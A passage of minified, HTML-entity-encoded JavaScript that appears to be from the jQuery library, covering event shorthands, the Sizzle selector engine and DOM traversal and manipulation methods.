this.mouseenter(a).mouseleave(b||a)}}),f.each(&#34;blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu&#34;.split(&#34; &#34;),function(a,b){f.fn[b]=function(a,c){c==null&amp;&amp;(c=a,a=null);return arguments.length&gt;0?this.on(b,null,a,c):this.trigger(b)},f.attrFn&amp;&amp;(f.attrFn[b]=!0),C.test(b)&amp;&amp;(f.event.fixHooks[b]=f.event.keyHooks),D.test(b)&amp;&amp;(f.event.fixHooks[b]=f.event.mouseHooks)}),function(){function x(a,b,c,e,f,g){for(var h=0,i=e.length;h&lt;i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}if(j.nodeType===1){g||(j[d]=c,j.sizset=h);if(typeof b!=&#34;string&#34;){if(j===b){k=!0;break}}else if(m.filter(b,[j]).length&gt;0){k=j;break}}j=j[a]}e[h]=k}}}function w(a,b,c,e,f,g){for(var h=0,i=e.length;h&lt;i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}j.nodeType===1&amp;&amp;!g&amp;&amp;(j[d]=c,j.sizset=h);if(j.nodeName.toLowerCase()===b){k=j;break}j=j[a]}e[h]=k}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|[&#39;&#34;][^&#39;&#34;]*[&#39;&#34;]|[^\[\]&#39;&#34;]+)+\]|\\.|[^ &gt;+~,(\[\\]+)+|[&gt;+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d=&#34;sizcache&#34;+(Math.random()+&#34;&#34;).replace(&#34;.&#34;,&#34;&#34;),e=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;[0,0].sort(function(){i=!1;return 0});var m=function(b,d,e,f){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&amp;&amp;d.nodeType!==9)return[];if(!b||typeof b!=&#34;string&#34;)return e;var i,j,k,l,n,q,r,t,u=!0,v=m.isXML(d),w=[],x=b;do{a.exec(&#34;&#34;),i=a.exec(x);if(i){x=i[3],w.push(i[1]);if(i[2]){l=i[3];break}}}while(i);if(w.length&gt;1&amp;&amp;p.exec(b))if(w.length===2&amp;&amp;o.relative[w[0]])j=y(w[0]+w[1],d,f);else{j=o.relative[w[0]]?[d]:m(w.shift(),d);while(w.length)b=w.shift(),o.relative[b]&amp;&amp;(b+=w.shift()),j=y(b,j,f)}else{!f&amp;&amp;w.length&gt;1&amp;&amp;d.nodeType===9&amp;&amp;!v&amp;&amp;o.match.ID.test(w[0])&amp;&amp;!o.match.ID.test(w[w.length-1])&amp;&amp;(n=m.find(w.shift(),d,v),d=n.expr?m.filter(n.expr,n.set)[0]:n.set[0]);if(d){n=f?{expr:w.pop(),set:s(f)}:m.find(w.pop(),w.length===1&amp;&amp;(w[0]===&#34;~&#34;||w[0]===&#34;+&#34;)&amp;&amp;d.parentNode?d.parentNode:d,v),j=n.expr?m.filter(n.expr,n.set):n.set,w.length&gt;0?k=s(j):u=!1;while(w.length)q=w.pop(),r=q,o.relative[q]?r=w.pop():q=&#34;&#34;,r==null&amp;&amp;(r=d),o.relative[q](k,r,v)}else k=w=[]}k||(k=j),k||m.error(q||b);if(g.call(k)===&#34;[object Array]&#34;)if(!u)e.push.apply(e,k);else if(d&amp;&amp;d.nodeType===1)for(t=0;k[t]!=null;t++)k[t]&amp;&amp;(k[t]===!0||k[t].nodeType===1&amp;&amp;m.contains(d,k[t]))&amp;&amp;e.push(j[t]);else for(t=0;k[t]!=null;t++)k[t]&amp;&amp;k[t].nodeType===1&amp;&amp;e.push(j[t]);else s(k,e);l&amp;&amp;(m(l,h,e,f),m.uniqueSort(e));return e};m.uniqueSort=function(a){if(u){h=i,a.sort(u);if(h)for(var b=1;b&lt;a.length;b++)a[b]===a[b-1]&amp;&amp;a.splice(b--,1)}return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length&gt;0},m.find=function(a,b,c){var d,e,f,g,h,i;if(!a)return[];for(e=0,f=o.order.length;e&lt;f;e++){h=o.order[e];if(g=o.leftMatch[h].exec(a)){i=g[1],g.splice(1,1);if(i.substr(i.length-1)!==&#34;\\&#34;){g[1]=(g[1]||&#34;&#34;).replace(j,&#34;&#34;),d=o.find[h](g,b,c);if(d!=null){a=a.replace(o.match[h],&#34;&#34;);break}}}}d||(d=typeof b.getElementsByTagName!=&#34;undefined&#34;?b.getElementsByTagName(&#34;*&#34;):[]);return{set:d,expr:a}},m.filter=function(a,c,d,e){var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&amp;&amp;c[0]&amp;&amp;m.isXML(c[0]);while(a&amp;&amp;c.length){for(h in o.filter)if((f=o.leftMatch[h].exec(a))!=null&amp;&amp;f[2]){k=o.filter[h],l=f[1],g=!1,f.splice(1,1);if(l.substr(l.length-1)===&#34;\\&#34;)continue;s===r&amp;&amp;(r=[]);if(o.preFilter[h]){f=o.preFilter[h](f,s,d,r,e,t);if(!f)g=i=!0;else if(f===!0)continue}if(f)for(n=0;(j=s[n])!=null;n++)j&amp;&amp;(i=k(j,f,n,s),p=e^i,d&amp;&amp;i!=null?p?g=!0:s[n]=!1:p&amp;&amp;(r.push(j),g=!0));if(i!==b){d||(s=r),a=a.replace(o.match[h],&#34;&#34;);if(!g)return[];break}}if(a===q)if(g==null)m.error(a);else break;q=a}return s},m.error=function(a){throw new Error(&#34;Syntax error, unrecognized expression: &#34;+a)};var n=m.getText=function(a){var b,c,d=a.nodeType,e=&#34;&#34;;if(d){if(d===1||d===9){if(typeof a.textContent==&#34;string&#34;)return a.textContent;if(typeof a.innerText==&#34;string&#34;)return a.innerText.replace(k,&#34;&#34;);for(a=a.firstChild;a;a=a.nextSibling)e+=n(a)}else if(d===3||d===4)return a.nodeValue}else for(b=0;c=a[b];b++)c.nodeType!==8&amp;&amp;(e+=n(c));return e},o=m.selectors={order:[&#34;ID&#34;,&#34;NAME&#34;,&#34;TAG&#34;],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=[&#39;&#34;]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)[&#39;&#34;]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:([&#39;&#34;])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\(([&#39;&#34;]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{&#34;class&#34;:&#34;className&#34;,&#34;for&#34;:&#34;htmlFor&#34;},attrHandle:{href:function(a){return a.getAttribute(&#34;href&#34;)},type:function(a){return a.getAttribute(&#34;type&#34;)}},relative:{&#34;+&#34;:function(a,b){var c=typeof b==&#34;string&#34;,d=c&amp;&amp;!l.test(b),e=c&amp;&amp;!d;d&amp;&amp;(b=b.toLowerCase());for(var f=0,g=a.length,h;f&lt;g;f++)if(h=a[f]){while((h=h.previousSibling)&amp;&amp;h.nodeType!==1);a[f]=e||h&amp;&amp;h.nodeName.toLowerCase()===b?h||!1:h===b}e&amp;&amp;m.filter(b,a,!0)},&#34;&gt;&#34;:function(a,b){var c,d=typeof b==&#34;string&#34;,e=0,f=a.length;if(d&amp;&amp;!l.test(b)){b=b.toLowerCase();for(;e&lt;f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e&lt;f;e++)c=a[e],c&amp;&amp;(a[e]=d?c.parentNode:c.parentNode===b);d&amp;&amp;m.filter(b,a,!0)}},&#34;&#34;:function(a,b,c){var d,f=e++,g=x;typeof b==&#34;string&#34;&amp;&amp;!l.test(b)&amp;&amp;(b=b.toLowerCase(),d=b,g=w),g(&#34;parentNode&#34;,b,f,a,d,c)},&#34;~&#34;:function(a,b,c){var d,f=e++,g=x;typeof b==&#34;string&#34;&amp;&amp;!l.test(b)&amp;&amp;(b=b.toLowerCase(),d=b,g=w),g(&#34;previousSibling&#34;,b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!=&#34;undefined&#34;&amp;&amp;!c){var d=b.getElementById(a[1]);return d&amp;&amp;d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!=&#34;undefined&#34;){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e&lt;f;e++)d[e].getAttribute(&#34;name&#34;)===a[1]&amp;&amp;c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!=&#34;undefined&#34;)return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=&#34; &#34;+a[1].replace(j,&#34;&#34;)+&#34; &#34;;if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&amp;&amp;(e^(h.className&amp;&amp;(&#34; &#34;+h.className+&#34; &#34;).replace(/[\t\n\r]/g,&#34; &#34;).indexOf(a)&gt;=0)?c||d.push(h):c&amp;&amp;(b[g]=!1));return!1},ID:function(a){return a[1].replace(j,&#34;&#34;)},TAG:function(a,b){return a[1].replace(j,&#34;&#34;).toLowerCase()},CHILD:function(a){if(a[1]===&#34;nth&#34;){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,&#34;&#34;);var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]===&#34;even&#34;&amp;&amp;&#34;2n&#34;||a[2]===&#34;odd&#34;&amp;&amp;&#34;2n+1&#34;||!/\D/.test(a[2])&amp;&amp;&#34;0n+&#34;+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&amp;&amp;m.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,&#34;&#34;);!f&amp;&amp;o.attrMap[g]&amp;&amp;(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||&#34;&#34;).replace(j,&#34;&#34;),a[2]===&#34;~=&#34;&amp;&amp;(a[4]=&#34; &#34;+a[4]+&#34; &#34;);return a},PSEUDO:function(b,c,d,e,f){if(b[1]===&#34;not&#34;)if((a.exec(b[3])||&#34;&#34;).length&gt;1||/^\w/.test(b[3]))b[3]=m(b[3],null,null,c);else{var g=m.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(o.match.POS.test(b[0])||o.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&amp;&amp;a.type!==&#34;hidden&#34;},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&amp;&amp;a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute(&#34;type&#34;),c=a.type;return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;text&#34;===c&amp;&amp;(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;radio&#34;===a.type},checkbox:function(a){return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;checkbox&#34;===a.type},file:function(a){return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;file&#34;===a.type},password:function(a){return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;password&#34;===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b===&#34;input&#34;||b===&#34;button&#34;)&amp;&amp;&#34;submit&#34;===a.type},image:function(a){return a.nodeName.toLowerCase()===&#34;input&#34;&amp;&amp;&#34;image&#34;===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b===&#34;input&#34;||b===&#34;button&#34;)&amp;&amp;&#34;reset&#34;===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b===&#34;input&#34;&amp;&amp;&#34;button&#34;===a.type||b===&#34;button&#34;},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b&lt;c[3]-0},gt:function(a,b,c){return b&gt;c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=o.filters[e];if(f)return f(a,c,b,d);if(e===&#34;contains&#34;)return(a.textContent||a.innerText||n([a])||&#34;&#34;).indexOf(b[3])&gt;=0;if(e===&#34;not&#34;){var g=b[3];for(var h=0,i=g.length;h&lt;i;h++)if(g[h]===a)return!1;return!0}m.error(e)},CHILD:function(a,b){var c,e,f,g,h,i,j,k=b[1],l=a;switch(k){case&#34;only&#34;:case&#34;first&#34;:while(l=l.previousSibling)if(l.nodeType===1)return!1;if(k===&#34;first&#34;)return!0;l=a;case&#34;last&#34;:while(l=l.nextSibling)if(l.nodeType===1)return!1;return!0;case&#34;nth&#34;:c=b[2],e=b[3];if(c===1&amp;&amp;e===0)return!0;f=b[0],g=a.parentNode;if(g&amp;&amp;(g[d]!==f||!a.nodeIndex)){i=0;for(l=g.firstChild;l;l=l.nextSibling)l.nodeType===1&amp;&amp;(l.nodeIndex=++i);g[d]=f}j=a.nodeIndex-e;return c===0?j===0:j%c===0&amp;&amp;j/c&gt;=0}},ID:function(a,b){return a.nodeType===1&amp;&amp;a.getAttribute(&#34;id&#34;)===b},TAG:function(a,b){return b===&#34;*&#34;&amp;&amp;a.nodeType===1||!!a.nodeName&amp;&amp;a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(&#34; &#34;+(a.className||a.getAttribute(&#34;class&#34;))+&#34; &#34;).indexOf(b)&gt;-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+&#34;&#34;,f=b[2],g=b[4];return d==null?f===&#34;!=&#34;:!f&amp;&amp;m.attr?d!=null:f===&#34;=&#34;?e===g:f===&#34;*=&#34;?e.indexOf(g)&gt;=0:f===&#34;~=&#34;?(&#34; &#34;+e+&#34; &#34;).indexOf(g)&gt;=0:g?f===&#34;!=&#34;?e!==g:f===&#34;^=&#34;?e.indexOf(g)===0:f===&#34;$=&#34;?e.substr(e.length-g.length)===g:f===&#34;|=&#34;?e===g||e.substr(0,g.length+1)===g+&#34;-&#34;:!1:e&amp;&amp;d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];if(f)return f(a,c,b,d)}}},p=o.match.POS,q=function(a,b){return&#34;\\&#34;+(b-0+1)};for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));var s=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];if(g.call(a)===&#34;[object Array]&#34;)Array.prototype.push.apply(d,a);else if(typeof a.length==&#34;number&#34;)for(var e=a.length;c&lt;e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var u,v;c.documentElement.compareDocumentPosition?u=function(a,b){if(a===b){h=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&amp;4?-1:1}:(u=function(a,b){if(a===b){h=!0;return 0}if(a.sourceIndex&amp;&amp;b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;if(g===i)return v(a,b);if(!g)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k&lt;c&amp;&amp;k&lt;d;k++)if(e[k]!==f[k])return v(e[k],f[k]);return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),function(){var a=c.createElement(&#34;div&#34;),d=&#34;script&#34;+(new Date).getTime(),e=c.documentElement;a.innerHTML=&#34;&lt;a name=&#39;&#34;+d+&#34;&#39;/&gt;&#34;,e.insertBefore(a,e.firstChild),c.getElementById(d)&amp;&amp;(o.find.ID=function(a,c,d){if(typeof c.getElementById!=&#34;undefined&#34;&amp;&amp;!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!=&#34;undefined&#34;&amp;&amp;e.getAttributeNode(&#34;id&#34;).nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c=typeof a.getAttributeNode!=&#34;undefined&#34;&amp;&amp;a.getAttributeNode(&#34;id&#34;);return a.nodeType===1&amp;&amp;c&amp;&amp;c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement(&#34;div&#34;);a.appendChild(c.createComment(&#34;&#34;)),a.getElementsByTagName(&#34;*&#34;).length&gt;0&amp;&amp;(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]===&#34;*&#34;){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&amp;&amp;d.push(c[e]);c=d}return c}),a.innerHTML=&#34;&lt;a href=&#39;#&#39;&gt;&lt;/a&gt;&#34;,a.firstChild&amp;&amp;typeof a.firstChild.getAttribute!=&#34;undefined&#34;&amp;&amp;a.firstChild.getAttribute(&#34;href&#34;)!==&#34;#&#34;&amp;&amp;(o.attrHandle.href=function(a){return a.getAttribute(&#34;href&#34;,2)}),a=null}(),c.querySelectorAll&amp;&amp;function(){var a=m,b=c.createElement(&#34;div&#34;),d=&#34;__sizzle__&#34;;b.innerHTML=&#34;&lt;p class=&#39;TEST&#39;&gt;&lt;/p&gt;&#34;;if(!b.querySelectorAll||b.querySelectorAll(&#34;.TEST&#34;).length!==0){m=function(b,e,f,g){e=e||c;if(!g&amp;&amp;!m.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&amp;&amp;(e.nodeType===1||e.nodeType===9)){if(h[1])return s(e.getElementsByTagName(b),f);if(h[2]&amp;&amp;o.find.CLASS&amp;&amp;e.getElementsByClassName)return s(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b===&#34;body&#34;&amp;&amp;e.body)return s([e.body],f);if(h&amp;&amp;h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return s([],f);if(i.id===h[3])return s([i],f)}try{return s(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&amp;&amp;e.nodeName.toLowerCase()!==&#34;object&#34;){var k=e,l=e.getAttribute(&#34;id&#34;),n=l||d,p=e.parentNode,q=/^\s*[+~]/.test(b);l?n=n.replace(/&#39;/g,&#34;\\$&amp;&#34;):e.setAttribute(&#34;id&#34;,n),q&amp;&amp;p&amp;&amp;(e=e.parentNode);try{if(!q||p)return s(e.querySelectorAll(&#34;[id=&#39;&#34;+n+&#34;&#39;] &#34;+b),f)}catch(r){}finally{l||k.removeAttribute(&#34;id&#34;)}}}return a(b,e,f,g)};for(var e in a)m[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement(&#34;div&#34;),&#34;div&#34;),e=!1;try{b.call(c.documentElement,&#34;[test!=&#39;&#39;]:sizzle&#34;)}catch(f){e=!0}m.matchesSelector=function(a,c){c=c.replace(/\=\s*([^&#39;&#34;\]]*)\s*\]/g,&#34;=&#39;$1&#39;]&#34;);if(!m.isXML(a))try{if(e||!o.match.PSEUDO.test(c)&amp;&amp;!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&amp;&amp;a.document.nodeType!==11)return f}}catch(g){}return m(c,null,null,[a]).length&gt;0}}}(),function(){var a=c.createElement(&#34;div&#34;);a.innerHTML=&#34;&lt;div class=&#39;test e&#39;&gt;&lt;/div&gt;&lt;div class=&#39;test&#39;&gt;&lt;/div&gt;&#34;;if(!!a.getElementsByClassName&amp;&amp;a.getElementsByClassName(&#34;e&#34;).length!==0){a.lastChild.className=&#34;e&#34;;if(a.getElementsByClassName(&#34;e&#34;).length===1)return;o.order.splice(1,0,&#34;CLASS&#34;),o.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!=&#34;undefined&#34;&amp;&amp;!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?m.contains=function(a,b){return a!==b&amp;&amp;(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(a.compareDocumentPosition(b)&amp;16)}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!==&#34;HTML&#34;:!1};var y=function(a,b,c){var d,e=[],f=&#34;&#34;,g=b.nodeType?[b]:b;while(d=o.match.PSEUDO.exec(a))f+=d[0],a=a.replace(o.match.PSEUDO,&#34;&#34;);a=o.relative[a]?a+&#34;*&#34;:a;for(var h=0,i=g.length;h&lt;i;h++)m(a,g[h],e,c);return m.filter(f,e)};m.attr=f.attr,m.selectors.attrMap={},f.find=m,f.expr=m.selectors,f.expr[&#34;:&#34;]=f.expr.filters,f.unique=m.uniqueSort,f.text=m.getText,f.isXMLDoc=m.isXML,f.contains=m.contains}();var L=/Until$/,M=/^(?:parents|prevUntil|prevAll)/,N=/,/,O=/^.[^:#\[\.,]*$/,P=Array.prototype.slice,Q=f.expr.match.POS,R={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!=&#34;string&#34;)return f(a).filter(function(){for(c=0,d=b.length;c&lt;d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack(&#34;&#34;,&#34;find&#34;,a),g,h,i;for(c=0,d=this.length;c&lt;d;c++){g=e.length,f.find(a,this[c],e);if(c&gt;0)for(h=g;h&lt;e.length;h++)for(i=0;i&lt;g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a&lt;c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(T(this,a,!1),&#34;not&#34;,a)},filter:function(a){return this.pushStack(T(this,a,!0),&#34;filter&#34;,a)},is:function(a){return!!a&amp;&amp;(typeof a==&#34;string&#34;?Q.test(a)?f(a,this.context).index(this[0])&gt;=0:f.filter(a,this).length&gt;0:this.filter(a).length&gt;0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h=1;while(g&amp;&amp;g.ownerDocument&amp;&amp;g!==b){for(d=0;d&lt;a.length;d++)f(g).is(a[d])&amp;&amp;c.push({selector:a[d],elem:g,level:h});g=g.parentNode,h++}return c}var i=Q.test(a)||typeof a!=&#34;string&#34;?f(a,b||this.context):0;for(d=0,e=this.length;d&lt;e;d++){g=this[d];while(g){if(i?i.index(g)&gt;-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length&gt;1?f.unique(c):c;return this.pushStack(c,&#34;closest&#34;,a)},index:function(a){if(!a)return this[0]&amp;&amp;this[0].parentNode?this.prevAll().length:-1;if(typeof a==&#34;string&#34;)return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a==&#34;string&#34;?f(a,b):f.makeArray(a&amp;&amp;a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(S(c[0])||S(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&amp;&amp;b.nodeType!==11?b:null},parents:function(a){return f.dir(a,&#34;parentNode&#34;)},parentsUntil:function(a,b,c){return f.dir(a,&#34;parentNode&#34;,c)},next:function(a){return f.nth(a,2,&#34;nextSibling&#34;)},prev:function(a){return f.nth(a,2,&#34;previousSibling&#34;)},nextAll:function(a){return f.dir(a,&#34;nextSibling&#34;)},prevAll:function(a){return f.dir(a,&#34;previousSibling&#34;)},nextUntil:function(a,b,c){return f.dir(a,&#34;nextSibling&#34;,c)},prevUntil:function(a,b,c){return f.dir(a,&#34;previousSibling&#34;,c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,&#34;iframe&#34;)?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c);L.test(a)||(d=c),d&amp;&amp;typeof d==&#34;string&#34;&amp;&amp;(e=f.filter(d,e)),e=this.length&gt;1&amp;&amp;!R[a]?f.unique(e):e,(this.length&gt;1||N.test(d))&amp;&amp;M.test(a)&amp;&amp;(e=e.reverse());return this.pushStack(e,a,P.call(arguments).join(&#34;,&#34;))}}),f.extend({filter:function(a,b,c){c&amp;&amp;(a=&#34;:not(&#34;+a+&#34;)&#34;);return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&amp;&amp;g.nodeType!==9&amp;&amp;(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&amp;&amp;e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&amp;&amp;++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&amp;&amp;a!==b&amp;&amp;c.push(a);return c}});var V=&#34;abbr|article|aside|audio|canvas|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video&#34;,W=/ jQuery\d+=&#34;(?:\d+|null)&#34;/g,X=/^\s+/,Y=/&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^&gt;]*)\/&gt;/ig,Z=/&lt;([\w:]+)/,$=/&lt;tbody/i,_=/&lt;|&amp;#?\w+;/,ba=/&lt;(?:script|style)/i,bb=/&lt;(?:script|object|embed|option|style)/i,bc=new RegExp(&#34;&lt;(?:&#34;+V+&#34;)&#34;,&#34;i&#34;),bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*&lt;!(?:\[CDATA\[|\-\-)/,bg={option:[1,&#34;&lt;select multiple=&#39;multiple&#39;&gt;&#34;,&#34;&lt;/select&gt;&#34;],legend:[1,&#34;&lt;fieldset&gt;&#34;,&#34;&lt;/fieldset&gt;&#34;],thead:[1,&#34;&lt;table&gt;&#34;,&#34;&lt;/table&gt;&#34;],tr:[2,&#34;&lt;table&gt;&lt;tbody&gt;&#34;,&#34;&lt;/tbody&gt;&lt;/table&gt;&#34;],td:[3,&#34;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&#34;,&#34;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#34;],col:[2,&#34;&lt;table&gt;&lt;tbody&gt;&lt;/tbody&gt;&lt;colgroup&gt;&#34;,&#34;&lt;/colgroup&gt;&lt;/table&gt;&#34;],area:[1,&#34;&lt;map&gt;&#34;,&#34;&lt;/map&gt;&#34;],_default:[0,&#34;&#34;,&#34;&#34;]},bh=U(c);bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,&#34;div&lt;div&gt;&#34;,&#34;&lt;/div&gt;&#34;]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!=&#34;object&#34;&amp;&amp;a!==b)return this.empty().append((this[0]&amp;&amp;this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&amp;&amp;b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&amp;&amp;a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=f.isFunction(a);return this.each(function(c){f(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,&#34;body&#34;)||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&amp;&amp;this.appendChild(a)})},prepend:function(){return 